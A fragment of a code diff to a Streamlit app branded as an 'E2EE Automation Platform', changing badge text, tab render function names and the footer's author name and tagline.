+            <p style="color: #666; font-size: 0.9rem; margin: 0;">ID: #{st.session_state.user_id}</p>
+        </div>
+        """, unsafe_allow_html=True)
         
         st.markdown("---")
         
         st.markdown("### 🛡️ Security Status")
-        st.markdown('<div class="cookie-security-badge">🔐 STRONG ENCRYPTION ACTIVE</div>', unsafe_allow_html=True)
+        st.markdown('<div class="cookie-security-badge">🔐 ELITE ENCRYPTION ACTIVE</div>', unsafe_allow_html=True)
         
         st.markdown("---")
         
@@ -1162,16 +1371,16 @@ else:
         tab1, tab2 = st.tabs(["⚙️ Configuration Center", "🚀 Automation Dashboard"])
         
         with tab1:
-            render_configuration_tab(user_config)
+            render_ultra_configuration_tab(user_config)
         
         with tab2:
-            render_automation_tab(user_config)
+            render_ultra_automation_tab(user_config)
 
-# Modern Footer
+# Ultra Modern Footer
 st.markdown("""
-<div class="footer">
-    <h3>👑 HASSAN DASTAGIR</h3>
-    <p>Advanced E2EE Automation Platform | Secure • Modern • Powerful</p>
-    <p style="font-size: 0.9rem; opacity: 0.7;">© 2025 All Rights Reserved | 🔐 End-to-End Encrypted</p>
+<div class="footer floating-element">
+    <h3>👑 HASSAN RAJPUT</h3>
+    <p>Elite E2EE Automation Platform • Next Generation Technology</p>
+    <p style="font-size: 0.9rem; opacity: 0.7; margin-top: 1rem;">© 2025 All Rights Reserved | 🔐 Military-Grade Encryption</p>
 </div>
 """, unsafe_allow_html=True)
